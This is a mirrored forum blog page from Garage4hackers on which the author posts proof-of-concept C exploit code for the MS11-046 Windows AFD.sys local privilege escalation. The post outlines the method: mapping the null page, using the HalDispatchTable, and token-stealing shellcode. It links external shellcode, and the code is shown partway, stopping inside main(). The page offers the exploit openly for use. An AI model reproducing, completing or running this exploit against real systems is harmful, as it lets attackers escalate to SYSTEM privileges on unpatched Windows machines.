<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html dir="ltr" lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml"><!-- Mirrored from garage4hackers.com/entry.php?b=316 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 13:34:34 GMT --><!-- Added by HTTrack --><head><meta content="text/html;charset=utf-8" http-equiv="content-type"/><!-- /Added by HTTrack -->

	<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<meta content="index.html" id="e_vb_meta_bburl" name="vb_meta_bburl"/>
<base/><!--[if IE]></base><![endif]-->
<meta content="vBulletin 4.2.1" name="generator"/>
<meta content="IE=9" http-equiv="X-UA-Compatible"/>

	<link href="favicon.ico" rel="Shortcut Icon" type="image/x-icon"/>


		<meta content="ms11-046, ms11-046 exploit, MS11-046 exploit Code, Windows local Privilege Escalation ., ethical hacking,exploits,webapplication,penetration testing,wireless,information security,virus,exploit coding,vbulletin,forum,bbs,discussion,bulletin board,indian hackers" name="keywords"/>
		<meta content="MS11-046 exploit Code, Windows local Privilege Escalation . Fb1h2s aka Rahul Sasi's Blog" name="description"/>



	<meta content="170793809601191" property="fb:app_id"/>
<meta content="Garage4hackers Forum" property="og:site_name"/>
<meta content="MS11-046 exploit Code, Windows local Privilege Escalation . Fb1h2s aka Rahul Sasi's Blog" property="og:description"/>
<meta content="entryb4ba.html?b=316" property="og:url"/>
<meta content="article" property="og:type"/>




	
		<script src="../yui.yahooapis.com/comboaa66?2.9.0/build/yuiloader-dom-event/yuiloader-dom-event.js&amp;2.9.0/build/connection/connection-min.js" type="text/javascript"></script>
	

<script type="text/javascript">
<!--
	if (typeof YAHOO === 'undefined') // Load ALL YUI Local
	{
		document.write('<script type="text/javascript" src="clientscript/yui/yuiloader-dom-event/yuiloader-dom-event6719.html?v=421"><\/script>');
		document.write('<script type="text/javascript" src="clientscript/yui/connection/connection-min6719.html?v=421"><\/script>');
		var yuipath = 'clientscript/yui';
		var yuicombopath = '';
		var remoteyui = false;
	}
	else	// Load Rest of YUI remotely (where possible)
	{
		var yuipath = '../external.html?link=http://yui.yahooapis.com/2.9.0/build';
		var yuicombopath = '../external.html?link=http://yui.yahooapis.com/combo';
		var remoteyui = true;
		if (!yuicombopath)
		{
			document.write('<script type="text/javascript" src="../yui.yahooapis.com/2.9.0/build/connection/connection-min6719.js?v=421"><\/script>');
		}
	}
	var SESSIONURL = "";
	var SECURITYTOKEN = "guest";
	var IMGDIR_MISC = "images/misc";
	var IMGDIR_BUTTON = "images/buttons";
	var vb_disable_ajax = parseInt("0", 10);
	var SIMPLEVERSION = "421";
	var BBURL = "index.html";
	var LOGGEDIN = 0 > 0 ? true : false;
	var THIS_SCRIPT = "entry";
	var RELPATH = "entryb4ba.html?b=316";
	var PATHS = {
		forum : "",
		cms   : "",
		blog  : ""
	};
	var AJAXBASEURL = "index.html";
// -->
</script>
<script src="clientscript/vbulletin-core6719.js?v=421" type="text/javascript"></script>



	<link href="external9476.php?type=RSS2" rel="alternate" title="Garage4hackers Forum RSS Feed" type="application/rss+xml"/>
	



	<link href="css30f2.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,editor.css,popupmenu.css,reset-fonts.css,vbulletin.css,vbulletin-chrome.css,vbulletin-formcontrols.css," rel="stylesheet" type="text/css"/>

	<!--[if lt IE 8]>
	<link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=popupmenu-ie.css,vbulletin-ie.css,vbulletin-chrome-ie.css,vbulletin-formcontrols-ie.css,editor-ie.css" />
	<![endif]-->


	
		
			<link href="blog_external9107.php?type=RSS2&amp;bloguserid=8" rel="alternate" title="Fb1h2s aka Rahul Sasi's Blog - Garage4hackers Forum Blog RSS Feed" type="application/rss+xml"/>
		
		<link href="blog_external9476.php?type=RSS2" rel="alternate" title="Garage4hackers Forum - Blog RSS Feed" type="application/rss+xml"/>
	
	<link href="forum.html" rel="pingback"/>
	
		<!--
			<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
				xmlns:dc="http://purl.org/dc/elements/1.1/"
				xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
			<rdf:Description
				rdf:about="http://garage4hackers.com/entry.php?b=316"
				dc:identifier="http://garage4hackers.com/entry.php?b=316"
				dc:title="MS11-046 exploit Code, Windows local Privilege Escalation ."
				trackback:ping="http://garage4hackers.com/blog_callback.php?b=316" />
			</rdf:RDF>
		-->
	
	
		<link href="css68b4.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=postbit-lite.css,blog.css,lightbox.css,attachment.css" rel="stylesheet" type="text/css"/>
	
	<!--[if lt IE 8]>
	<script type="text/javascript" src="clientscript/vbulletin-threadlist-ie.js?v=421"></script>
	<link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=postbit-lite-ie.css,blog-ie.css" />
	<![endif]-->
	
	
	
	
		<script type="text/javascript">
		<!--
			vBulletin.register_control("vB_Blog_Userid", "8");
		//-->
		</script>
	
<script src="clientscript/vbulletin_ajax_suggest6719.js?v=421" type="text/javascript"></script>
	
		<title>MS11-046 exploit Code, Windows local Privilege Escalation . - Blogs - Garage4hackers Forum</title>
	
	<link href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" rel="stylesheet" type="text/css"/>

</head>
<body>
<div class="above_body"> <!-- closing tag is in template navbar -->
<div class="floatcontainer doc_header" id="header">
	<div><a class="logo-image" href="forum.html" name="top"><img alt="Garage4hackers Forum" src="images/misc/vbulletin4_logo.png"/></a></div>
	<div class="toplinks" id="toplinks">
		
			<ul class="nouser">
			
				<li><a href="register.html" rel="nofollow">Register</a></li>
			
				<li><a href="faq.html" rel="help">Help</a></li>
				<li>
			<script src="clientscript/vbulletin_md56719.html?v=421" type="text/javascript"></script>
			<form action="../external.html?link=http://garage4hackers.com/login.php?do=login" id="navbar_loginform" method="post" onsubmit="md5hash(vb_login_password, vb_login_md5password, vb_login_md5password_utf, 0)">
				<fieldset class="logindetails" id="logindetails">
					<div>
						<div>
					<input accesskey="u" class="textbox default-value" id="navbar_username" name="vb_login_username" size="10" tabindex="101" type="text" value="User Name"/>
					<input class="textbox" id="navbar_password" name="vb_login_password" size="10" tabindex="102" type="password"/>
					<input class="textbox default-value" id="navbar_password_hint" name="vb_login_password_hint" size="10" style="display:none;" tabindex="102" type="text" value="Password"/>
					<input accesskey="s" class="loginbutton" tabindex="104" title="Enter your username and password in the boxes provided to login, or click the 'register' button to create a profile for yourself." type="submit" value="Log in"/>
						</div>
					</div>
				</fieldset>
				<div class="remember" id="remember">
					<label for="cb_cookieuser_navbar"><input accesskey="c" class="cb_cookieuser_navbar" id="cb_cookieuser_navbar" name="cookieuser" tabindex="103" type="checkbox" value="1"/> Remember Me?</label>
				</div>

				<input name="s" type="hidden" value=""/>
				<input name="securitytoken" type="hidden" value="guest"/>
				<input name="do" type="hidden" value="login"/>
				<input name="vb_login_md5password" type="hidden"/>
				<input name="vb_login_md5password_utf" type="hidden"/>
			</form>
			<script type="text/javascript">
			YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
			YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
			vB_XHTML_Ready.subscribe(function()
			{
			//
				YAHOO.util.Event.on('navbar_username', "focus", navbar_username_focus);
				YAHOO.util.Event.on('navbar_username', "blur", navbar_username_blur);
				YAHOO.util.Event.on('navbar_password_hint', "focus", navbar_password_hint);
				YAHOO.util.Event.on('navbar_password', "blur", navbar_password);
			});
			
			function navbar_username_focus(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				if (textbox.value == 'User Name')
				{
				//
					textbox.value='';
					textbox.style.color='#000000';
				}
			}

			function navbar_username_blur(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				if (textbox.value == '')
				{
				//
					textbox.value='User Name';
					textbox.style.color='#777777';
				}
			}
			
			function navbar_password_hint(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				
				YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "none");
				YAHOO.util.Dom.setStyle('navbar_password', "display", "inline");
				YAHOO.util.Dom.get('navbar_password').focus();
			}

			function navbar_password(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				
				if (textbox.value == '')
				{
					YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
					YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
				}
			}
			</script>
				</li>
				
					<li class="hidden" id="fb_headerbox">

	<a href="#" id="fb_loginbtn"><img alt="The Facebook Platform" src="images/misc/facebook_login.gif"/></a>

</li>

				
			</ul>
		
	</div>
	<div class="ad_global_header">
		 
		 
	</div>
	<hr/>
</div>
<div class="navbar" id="navbar">
	<ul class="navtabs floatcontainer" id="navtabs">
		
		
	
		<li id="vbtab_whatsnew">
			<a class="navtab" href="activity.html">What's New?</a>
		</li>
		
		

	
		<li id="vbtab_cms">
			<a class="navtab" href="content.html">Articles</a>
		</li>
		
		

	
		<li id="vbtab_forum">
			<a class="navtab" href="forum.html">Forum</a>
		</li>
		
		

	
		<li class="selected" id="vbtab_blog">
			<a class="navtab" href="blog.html">Blogs</a>
		</li>
		
		
			<ul class="floatcontainer">
				
					
						
							<li id="vbblog_recent"><a href="blog2d60.html?do=list">Recent Entries</a></li>
						
					
				
					
						
							<li id="vbblog_popular"><a href="blog7e3c.html?do=list&amp;blogtype=best">Most Popular</a></li>
						
					
				
					
						
							<li id="vbblog_member"><a href="blogd08d.html?do=bloglist">Member Blogs</a></li>
						
					
				
			</ul>
		

	
		<li id="tab_nja4_357">
			<a class="navtab" href="pages7b82.html?pageid=2">G4H Team</a>
		</li>
		
		

	
		<li id="tab_nta0_579">
			<a class="navtab" href="pages8782.html?pageid=3">IRC</a>
		</li>
		
		

	
		<li id="tab_nta0_442">
			<a class="navtab" href="pagesdbe0.html?pageid=4">Ranchoddas</a>
		</li>
		
		

		<li>
            <a class="navtab" href="pages.html">Events and Conferences</a></li>
	</ul>
	
		<div class="globalsearch" id="globalsearch">
			<form action="../external.html?link=http://garage4hackers.com/search.php?do=process" class="navbar_search" id="navbar_search" method="post">
				
				<input name="securitytoken" type="hidden" value="guest"/>
				<input name="do" type="hidden" value="process"/>
				<span class="textboxcontainer"><span><input class="textbox" name="query" tabindex="99" type="text" value=""/></span></span>
				<span class="buttoncontainer"><span><input class="searchbutton" name="submit" onclick="document.getElementById('navbar_search').submit;" src="images/buttons/search.html" tabindex="100" type="image"/></span></span>
			</form>
			<ul class="navbar_advanced_search">
				<li><a accesskey="4" href="search.html">Advanced Search</a></li>
				
			</ul>
		</div>
	
</div>
</div><!-- closing div for above_body -->

<div class="body_wrapper">
<div class="breadcrumb" id="breadcrumb">
	<ul class="floatcontainer">
		<li class="navbithome"><a accesskey="1" href="content.html"><img alt="Home" src="images/misc/navbit-home.png"/></a></li>
		
	<li class="navbit"><a href="blog.html">Blogs</a></li>

	<li class="navbit"><a href="bloge81f.html?u=8">Fb1h2s aka Rahul Sasi's Blog</a></li>

		
	<li class="navbit lastnavbit"><span>MS11-046 exploit Code, Windows local Privilege Escalation .</span></li>

	</ul>
	<hr/>
</div>


<div style="width:728px; margin:0 auto; padding-bottom:1em">
<script type="text/javascript"><!--
google_ad_client = "ca-pub-6847984837250662";
google_ad_host = "ca-host-pub-2606800903002383";
google_ad_width = 728;
google_ad_height = 15;
google_ad_format = "728x15_0ads_al_s";
google_ad_channel = "";
google_color_border = "";
google_color_bg = "";
google_color_link = "";
google_color_text = "";
google_color_url = "";
google_ui_features = "rc:6";
//-->
</script>
<script src="../pagead2.googlesyndication.com/pagead/show_ads.js" type="text/javascript">
</script>
</div>

<div id="ad_global_below_navbar"><script async="" src="../pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- garage1 -->
<ins class="adsbygoogle" data-ad-client="ca-pub-6847984837250662" data-ad-slot="4036513682" style="display:inline-block;width:728px;height:90px"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></div>


	<form action="../external.html?link=http://garage4hackers.com/profile.php?do=dismissnotice" class="notices" id="notices" method="post">
		<input name="do" type="hidden" value="dismissnotice"/>
		<input name="s" type="hidden" value=""/>
		<input name="securitytoken" type="hidden" value="guest"/>
		<input id="dismiss_notice_hidden" name="dismiss_noticeid" type="hidden" value=""/>
		<input name="url" type="hidden" value=""/>
		<ol>
			<li class="restore" id="navbar_notice_2">
	
	
<h2>
The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen forever</a> - but it won't die; it'll stay for long in search engine results and we hope it would keep helping newbies in some way or other - cheers! 


</h2>

<!-- Mirrored from garage4hackers.com/entry.php?b=316 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 13:34:34 GMT -->

</li>
		</ol>
	</form>



<div class="blog" id="usercss">
	<div class="cleardiv"></div>

	
	
	<div id="content_container">
		<div id="content">
			<div class="blockrow restrain_container" id="content_inner">
			<!-- main content -->
			<div id="pagetitle">
	
	<a href="blog_external9107.php?type=RSS2&amp;bloguserid=8" id="rssicon" rel="nofollow"><img alt="View RSS Feed" border="0" class="inlineimg" src="images/misc/rss_40b.png"/></a>
	
	<h1>Fb1h2s aka Rahul Sasi's Blog</h1>
</div>




<div id="ad_blogshowentry_before"><script type="text/javascript"><!--
google_ad_client = "pub-6847984837250662";
/* 728x90, created 7/11/10 blog entry */
google_ad_slot = "0606213533";
google_ad_width = 728;
google_ad_height = 90;
//-->
</script>
<script src="../pagead2.googlesyndication.com/pagead/show_ads.js" type="text/javascript">
</script></div>
<div id="above_blogentry">
	
</div>
<div class="block blogentrybit" id="entry316">
	<h4 class="blog_header" id="blog_title">
		MS11-046 exploit Code, Windows local Privilege Escalation .
		
		
	</h4>
	<div class="fly">
		
			<div class="popupmenu" id="blograting">
				<h6><a class="popupctrl" href="javascript://" id="blograting_current">Rate this Entry</a></h6>
				<form action="../external.html?link=http://garage4hackers.com/blog.php" id="blog_blograte_form" method="post">
					<div class="popupbody popuphover">
						<ul>
							
								<li><label for="r5"><span class="rating r5">
									<input id="r5" name="vote" type="radio" value="5"/> Excellent
								</span></label></li>
								<li><label for="r4"><span class="rating r4_right">
									<input id="r4" name="vote" type="radio" value="4"/> Good
								</span></label></li>
								<li><label for="r3"><span class="rating r3_right">
									<input id="r3" name="vote" type="radio" value="3"/> Average
								</span></label></li>
								<li><label for="r2"><span class="rating r2_right">
									<input id="r2" name="vote" type="radio" value="2"/> Bad
								</span></label></li>
								<li><label for="r1"><span class="rating r1_right">
									<input id="r1" name="vote" type="radio" value="1"/> Terrible
								</span></label></li>
								<li class="formsubmit"><input class="button" type="submit" value="Vote Now"/></li>
							
						</ul>
						<input name="s" type="hidden" value=""/>
						<input name="securitytoken" type="hidden" value="guest"/>
						<input name="do" type="hidden" value="rate"/>
						<input name="b" type="hidden" value="316"/>
					</div>
				</form>
				<script src="clientscript/blog_ajax_rate6719.html?v=421" type="text/javascript"></script>
				<script type="text/javascript">
				<!--
					var blogid = 316;
					vB_AJAX_BlogRate_Init('blog_blograte_form');
				//-->
				</script>
			</div>
		
	</div>
	<div class="block blogbit">
		<div class="bloghead">
			<div class="fly">
				
<a class="comments" href="entryb4ba.html?b=316#comments">0 Comments</a>
				
				
			</div>
			<div class="blog_date">
				by <div class="popupmenu memberaction">
	<a class="username offline popupctrl" href="membere81f.html?u=8" title="fb1h2s is offline"><strong>fb1h2s</strong></a>
	<ul class="popupbody popuphover memberaction_body">
		<li class="left">
			<a class="siteicon_profile" href="membere81f.html?u=8">
				View Profile
			</a>
		</li>
		
		<li class="right">
			<a class="siteicon_forum" href="search9898.html?do=finduser&amp;userid=8&amp;contenttype=vBForum_Post&amp;showposts=1" rel="nofollow">
				View Forum Posts
			</a>
		</li>
		
		
		<li class="left">
			<a class="siteicon_message" href="privatedce0.html?do=newpm&amp;u=8" rel="nofollow">
				Private Message
			</a>
		</li>
		
		
		
		<li class="right">
			<a class="siteicon_blog" href="bloge81f.html?u=8" rel="nofollow">
				View Blog Entries
			</a>
		</li>
		
		
		
		<li class="left">
			<a class="siteicon_homepage" href="index.html">
				Visit Homepage
			</a>
		</li>
		
		
		
		<li class="right">
			<a class="siteicon_article" href="list2c25.html?r=author/8-fb1h2s" rel="nofollow">
				View Articles
			</a>
		</li>
		

		

		
		
	</ul>
</div>, 04-08-2012 at 05:01 PM  (8417 Views)
			</div>
		</div>
		
			
<fb:like action="../external.html?link=http://garage4hackers.com/like" colorscheme="light" font="tahoma" href="entryb4ba.html?b=316" layout="standard" show_faces="false" width="260"></fb:like>
		
		<div class="blogbody postcontainer">
			<div id="entry_text_316">
				<blockquote class="blogcontent restore floatcontainer">
					There was a good article released by Joni on MS11-046 vulnerability based on a malware he analysed .<br/>
<a href="../www.exploit-db.com/wp-content/themes/exploit/docs/18712.html" target="_blank">http://www.exploit-db.com/wp-content...docs/18712.pdf</a><br/>
So I taught of spending my staurday night building an exploit for this .<br/>
<br/>
Windows [not sure about Win 7] lets Mapping of 0x00000000 in user space, and this particular vulnerability windows fix [Ms011-46] was by adding a simple check for Null Pntr  in the AFD.sys, which I find odd, so I assume Win 7 it would be possible too[#assuming ] .<br/>
<br/>
There was no POC exploit available, so I just made a quick POC, well things were clear form Ronnie's article so nothing big .<br/>
<br/>
<br/>
<br/>
MS11-046 Exploit Code by fb1h2s<br/>
<br/>
MS11-046 Was a Zero day found in the wild , reported to MS by<br/>
<br/>
Steven Adair from the Shadowserver Foundation and Chris S .<br/>
<a href="../external.html?link=http://technet.microsoft.com/en-us/security/bulletin/ms11-046" target="_blank">Microsoft Security Bulletin MS11-046 - Important : Vulnerability in Ancillary Function Driver Could Allow Elevation of Privilege (2503665)</a><br/>
<br/>
Ronnie Johndas wrote the writeup dissecting a malware with this exploit .<br/>
<a href="../www.exploit-db.com/wp-content/themes/exploit/docs/18712.html" target="_blank">http://www.exploit-db.com/wp-content...docs/18712.pdf</a><br/>
<br/>
I Rahul Sasi(fb1h2s) just made the POC exploit available .<br/>
<a href="index.html" target="_blank">Garage4hackers Forum - Home</a><br/>
<a href="../external.html?link=http://twitter.com/#!/fb1h2s" target="_blank">Twitter</a><br/>
<br/>
Reference: ms8-66, ms6-49 exp codes<br/>
<br/>
**************************************************  ***********<br/>
Too lazy to add the shellcode , you could steel this one, it should work .<br/>
<br/>
<a href="../external.html?link=http://www.whitecell.org/list.php?id=50" target="_blank">Symantec Local Privilege Escalation Vulnerability Exploit</a><br/>
<br/>
The shell code to acheive privilage esclation as per the article  used the following steps<br/>
<br/>
<a href="../www.exploit-db.com/wp-content/themes/exploit/docs/18712.html" target="_blank">http://www.exploit-db.com/wp-content...docs/18712.pdf</a><br/>
 .<br/>
<br/>
 1) Use PslookupProcessId get system token<br/>
 2) Replace it with the current process token, and we are system<br/>
<br/>
<br/>
**************************************************  ***********<br/>
C Code: <br/>
<br/>
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code" style="height:372px;"><code><code><span style="color: #000000">
<span style="color: #0000BB"></span><span style="color: #007700">*/
<br/>
<br/></span><span style="color: #FF8000">#define SystemModuleInformation     11
<br/>#ifndef WIN32_LEAN_AND_MEAN
<br/>#define WIN32_LEAN_AND_MEAN
<br/>#endif
<br/>#ifndef _WIN32_WINNT
<br/>//For XP Only
<br/>#define _WIN32_WINNT 0x0501
<br/>#endif
<br/>// We have a client sock conencting to 135 considering the fact it's open by default
<br/>#define DEFAULT_ADDR "127.0.0.1"
<br/>#define DEFAULT_PORT "135"
<br/>
<br/>#include &lt;windows.h&gt;
<br/>#include &lt;winsock2.h&gt;
<br/>#include &lt;ws2tcpip.h&gt;
<br/>#include &lt;stdio.h&gt;
<br/>#include &lt;iphlpapi.h&gt;
<br/>#include &lt;stdio.h&gt;
<br/>
<br/>#pragma comment(lib, "Ws2_32.lib")
<br/>#pragma comment (lib, "ntdll.lib")
<br/>
<br/>
<br/>//lets make a nop ret sandwitch
<br/></span><span style="color: #0000BB">unsigned char hexcode</span><span style="color: #007700">[]=</span><span style="color: #DD0000">"\x90\x90\x90\xcc\x90\x90\x90\x90"</span><span style="color: #007700">;
<br/>
<br/></span><span style="color: #FF8000">/*
<br/>The shell code to acheive privilage esclation
<br/>
<br/>Add you shellcode here as per the article http://www.exploit-db.com/wp-content/themes/exploit/docs/18712.pdf
<br/> the malware used the following method.
<br/>
<br/> 1) Wse PslookupProcessId get system token
<br/> 2) Replace it with the current process token, and we are system
<br/>
<br/>*/
<br/>
<br/>// he gets the above sandwitch
<br/> </span><span style="color: #0000BB">LPVOID hexcode_addr </span><span style="color: #007700">= (</span><span style="color: #0000BB">LPVOID</span><span style="color: #007700">)</span><span style="color: #0000BB">0x00000000</span><span style="color: #007700">;
<br/>
<br/> </span><span style="color: #0000BB">DWORD sizeofshell </span><span style="color: #007700">= </span><span style="color: #0000BB">0x1000</span><span style="color: #007700">;
<br/></span><span style="color: #FF8000">// he gets the haldispatch
<br/>
<br/> </span><span style="color: #0000BB">ULONG_PTR HalDispatchTable</span><span style="color: #007700">;
<br/>
<br/> </span><span style="color: #FF8000">//Holds the base adress of krnl
<br/>
<br/></span><span style="color: #0000BB">PVOID  krl_base</span><span style="color: #007700">;
<br/>
<br/></span><span style="color: #FF8000">//load adress of those %krnl%.exe dudes
<br/></span><span style="color: #0000BB">HMODULE krl_addr</span><span style="color: #007700">;
<br/>
<br/>
<br/>
<br/></span><span style="color: #FF8000">// structure system_module_info data
<br/>
<br/></span><span style="color: #0000BB">typedef struct _SYSTEM_MODULE_INFORMATION </span><span style="color: #007700">{
<br/>    </span><span style="color: #0000BB">ULONG  Reserved</span><span style="color: #007700">[</span><span style="color: #0000BB">2</span><span style="color: #007700">];
<br/>    </span><span style="color: #0000BB">PVOID  Base</span><span style="color: #007700">;
<br/>    </span><span style="color: #0000BB">ULONG  Size</span><span style="color: #007700">;
<br/>    </span><span style="color: #0000BB">ULONG  Flags</span><span style="color: #007700">;
<br/>    </span><span style="color: #0000BB">USHORT Index</span><span style="color: #007700">;
<br/>    </span><span style="color: #0000BB">USHORT Unknown</span><span style="color: #007700">;
<br/>    </span><span style="color: #0000BB">USHORT LoadCount</span><span style="color: #007700">;
<br/>    </span><span style="color: #0000BB">USHORT ModuleNameOffset</span><span style="color: #007700">;
<br/>    </span><span style="color: #0000BB">CHAR   ImageName</span><span style="color: #007700">[</span><span style="color: #0000BB">256</span><span style="color: #007700">];
<br/>} </span><span style="color: #0000BB">SYSTEM_MODULE_INFORMATION</span><span style="color: #007700">, *</span><span style="color: #0000BB">PSYSTEM_MODULE_INFORMATION</span><span style="color: #007700">;
<br/>
<br/></span><span style="color: #FF8000">//sock addrinfo
<br/></span><span style="color: #0000BB">struct addrinfo </span><span style="color: #007700">*</span><span style="color: #0000BB">result </span><span style="color: #007700">= </span><span style="color: #0000BB">NULL</span><span style="color: #007700">,
<br/>                *</span><span style="color: #0000BB">ptr </span><span style="color: #007700">= </span><span style="color: #0000BB">NULL</span><span style="color: #007700">,
<br/>                </span><span style="color: #0000BB">hints</span><span style="color: #007700">;
<br/>
<br/>
<br/></span><span style="color: #FF8000">// The list of loaded drivers
<br/></span><span style="color: #0000BB">typedef LONG NTSTATUS</span><span style="color: #007700">, *</span><span style="color: #0000BB">PNTSTATUS</span><span style="color: #007700">;
<br/>
<br/></span><span style="color: #0000BB">NTSTATUS
<br/>NTAPI
<br/>ZwQuerySystemInformation</span><span style="color: #007700">(
<br/>        </span><span style="color: #0000BB">IN ULONG SystemInformationClass</span><span style="color: #007700">,
<br/>        </span><span style="color: #0000BB">IN PVOID SystemInformation</span><span style="color: #007700">,
<br/>        </span><span style="color: #0000BB">IN ULONG SystemInformationLength</span><span style="color: #007700">,
<br/>        </span><span style="color: #0000BB">OUT PULONG ReturnLength</span><span style="color: #007700">);
<br/></span><span style="color: #0000BB">typedef enum _KPROFILE_SOURCE </span><span style="color: #007700">{
<br/>
<br/>
<br/>    </span><span style="color: #0000BB">ProfileTime</span><span style="color: #007700">,
<br/>    </span><span style="color: #0000BB">ProfileAlignmentFixup</span><span style="color: #007700">,
<br/>    </span><span style="color: #0000BB">ProfileTotalIssues</span><span style="color: #007700">,
<br/>    </span><span style="color: #0000BB">ProfilePipelineDry</span><span style="color: #007700">,
<br/>    </span><span style="color: #0000BB">ProfileLoadInstructions</span><span style="color: #007700">,
<br/>    </span><span style="color: #0000BB">ProfilePipelineFrozen</span><span style="color: #007700">,
<br/>    </span><span style="color: #0000BB">ProfileBranchInstructions</span><span style="color: #007700">,
<br/>    </span><span style="color: #0000BB">ProfileTotalNonissues</span><span style="color: #007700">,
<br/>    </span><span style="color: #0000BB">ProfileDcacheMisses</span><span style="color: #007700">,
<br/>    </span><span style="color: #0000BB">ProfileIcacheMisses</span><span style="color: #007700">,
<br/>    </span><span style="color: #0000BB">ProfileCacheMisses</span><span style="color: #007700">,
<br/>    </span><span style="color: #0000BB">ProfileBranchMispredictions</span><span style="color: #007700">,
<br/>    </span><span style="color: #0000BB">ProfileStoreInstructions</span><span style="color: #007700">,
<br/>    </span><span style="color: #0000BB">ProfileFpInstructions</span><span style="color: #007700">,
<br/>    </span><span style="color: #0000BB">ProfileIntegerInstructions</span><span style="color: #007700">,
<br/>    </span><span style="color: #0000BB">Profile2Issue</span><span style="color: #007700">,
<br/>    </span><span style="color: #0000BB">Profile3Issue</span><span style="color: #007700">,
<br/>    </span><span style="color: #0000BB">Profile4Issue</span><span style="color: #007700">,
<br/>    </span><span style="color: #0000BB">ProfileSpecialInstructions</span><span style="color: #007700">,
<br/>    </span><span style="color: #0000BB">ProfileTotalCycles</span><span style="color: #007700">,
<br/>    </span><span style="color: #0000BB">ProfileIcacheIssues</span><span style="color: #007700">,
<br/>    </span><span style="color: #0000BB">ProfileDcacheAccesses</span><span style="color: #007700">,
<br/>    </span><span style="color: #0000BB">ProfileMemoryBarrierCycles</span><span style="color: #007700">,
<br/>    </span><span style="color: #0000BB">ProfileLoadLinkedIssues</span><span style="color: #007700">,
<br/>    </span><span style="color: #0000BB">ProfileMaximum
<br/>
<br/></span><span style="color: #007700">} </span><span style="color: #0000BB">KPROFILE_SOURCE</span><span style="color: #007700">, *</span><span style="color: #0000BB">PKPROFILE_SOURCE</span><span style="color: #007700">;
<br/>
<br/>
<br/></span><span style="color: #0000BB">typedef DWORD </span><span style="color: #007700">(</span><span style="color: #0000BB">WINAPI </span><span style="color: #007700">*</span><span style="color: #0000BB">PNTQUERYINTERVAL</span><span style="color: #007700">)( </span><span style="color: #0000BB">KPROFILE_SOURCE ProfileSource</span><span style="color: #007700">,</span><span style="color: #0000BB">PULONG Interval </span><span style="color: #007700">);
<br/>
<br/></span><span style="color: #0000BB">typedef NTSTATUS </span><span style="color: #007700">(</span><span style="color: #0000BB">WINAPI </span><span style="color: #007700">*</span><span style="color: #0000BB">PNTALLOCATE</span><span style="color: #007700">)( </span><span style="color: #0000BB">IN HANDLE ProcessHandle</span><span style="color: #007700">,
<br/>          </span><span style="color: #0000BB">IN OUT PVOID </span><span style="color: #007700">*</span><span style="color: #0000BB">BaseAddress</span><span style="color: #007700">,
<br/>          </span><span style="color: #0000BB">IN ULONG ZeroBits</span><span style="color: #007700">,
<br/>          </span><span style="color: #0000BB">IN OUT PULONG RegionSize</span><span style="color: #007700">,
<br/>          </span><span style="color: #0000BB">IN ULONG AllocationType</span><span style="color: #007700">,
<br/>          </span><span style="color: #0000BB">IN ULONG Protect </span><span style="color: #007700">);
<br/>
<br/>
<br/>
<br/>
<br/></span><span style="color: #0000BB">int main</span><span style="color: #007700">() {
<br/>
<br/>    </span><span style="color: #FF8000">//All the declarations goes here
<br/>
<br/>    </span><span style="color: #0000BB">PNTQUERYINTERVAL ZwQueryIntervalProfile</span><span style="color: #007700">;
<br/>    </span><span style="color: #0000BB">PNTALLOCATE ZwAllocateVirtualMemory</span><span style="color: #007700">;
<br/>    </span><span style="color: #0000BB">KPROFILE_SOURCE stProfile </span><span style="color: #007700">= </span><span style="color: #0000BB">ProfileTotalIssues</span><span style="color: #007700">;
<br/>    </span><span style="color: #0000BB">ULONG Ret_size</span><span style="color: #007700">;
<br/>    </span><span style="color: #0000BB">NTSTATUS status</span><span style="color: #007700">,</span><span style="color: #0000BB">alloc_status </span><span style="color: #007700">;
<br/>
<br/>    </span><span style="color: #0000BB">ULONG i</span><span style="color: #007700">, </span><span style="color: #0000BB">n</span><span style="color: #007700">, *</span><span style="color: #0000BB">q</span><span style="color: #007700">;
<br/>    </span><span style="color: #0000BB">PSYSTEM_MODULE_INFORMATION p</span><span style="color: #007700">;
<br/>    </span><span style="color: #0000BB">void </span><span style="color: #007700">*</span><span style="color: #0000BB">base</span><span style="color: #007700">;
<br/>    </span><span style="color: #0000BB">WSADATA wsaData</span><span style="color: #007700">;
<br/>    </span><span style="color: #0000BB">SOCKET ConnectSocket </span><span style="color: #007700">= </span><span style="color: #0000BB">INVALID_SOCKET</span><span style="color: #007700">;
<br/>    </span><span style="color: #0000BB">int iResult</span><span style="color: #007700">;
<br/>    </span><span style="color: #0000BB">DWORD ibuf </span><span style="color: #007700">[</span><span style="color: #0000BB">0x30</span><span style="color: #007700">];
<br/>    </span><span style="color: #0000BB">DWORD obuf </span><span style="color: #007700">[</span><span style="color: #0000BB">0x30</span><span style="color: #007700">];
